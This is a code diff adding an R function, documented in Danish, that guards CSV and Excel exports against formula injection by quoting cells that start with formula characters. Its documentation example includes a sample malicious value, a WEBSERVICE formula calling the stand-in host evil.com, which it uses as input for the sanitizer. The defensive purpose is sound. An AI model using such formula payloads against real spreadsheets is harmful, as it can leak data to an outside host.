@@ -181,3 +181,64 @@ create_security_warning <- function(field_name, issue_type, additional_info = NU
 
   return(base_message)
 }
+
+#' Sanitize CSV Output for Formula Injection Protection
+#'
+#' Sikrer at data eksporteret til CSV/Excel ikke kan eksekvere formler.
+#' Forhindrer CSV injection attacks hvor formler som =SUM() eller @WEBSERVICE()
+#' kan eksekveres når filen åbnes i Excel.
+#'
+#' @param data Data frame at sanitize for export
+#'
+#' @return Data frame med sanitized værdier
+#'
+#' @details
+#' Karakterer der kan starte en formel i Excel:
+#' - = (formula)
+#' - + (addition formula)
+#' - - (subtraction formula)
+#' - @ (Excel 2010+ formula prefix)
+#' - \\t (tab - kan bruges til command injection)
+#' - \\r (carriage return - kan bruges til command injection)
+#'
+#' Løsning: Prefix med single quote (') for at tvinge text mode.
+#'
+#' @examples
+#' \dontrun{
+#' # Eksempel med farlige værdier
+#' data <- data.frame(
+#'   normal = c("test", "data"),
+#'   dangerous = c("=SUM(A1:A10)", "@WEBSERVICE('evil.com')")
+#' )
+#'
+#' safe_data <- sanitize_csv_output(data)
+#' # dangerous kolonne bliver: c("'=SUM(A1:A10)", "'@WEBSERVICE('evil.com')")
+#' }
+#'
+#' @export
+sanitize_csv_output <- function(data) {
+  if (!is.data.frame(data)) {
+    stop("Input skal være en data frame")
+  }
+
+  # Karakterer der kan starte en formel i Excel
+  formula_chars <- c("=", "+", "-", "@", "\t", "\r")
+
+  # Sanitize alle character kolonner
+  data <- data %>%
+    dplyr::mutate(
+      dplyr::across(
+        dplyr::where(is.character),
+        ~ {
+          dplyr::if_else(
+            # Check om første karakter er farlig
+            !is.na(.x) & substr(.x, 1, 1) %in% formula_chars,
+            paste0("'", .x), # Prefix med ' for at tvinge text mode
+            .x # Bevar uændret hvis sikker
+          )
+        }
+      )
+    )
+
+  return(data)
+}
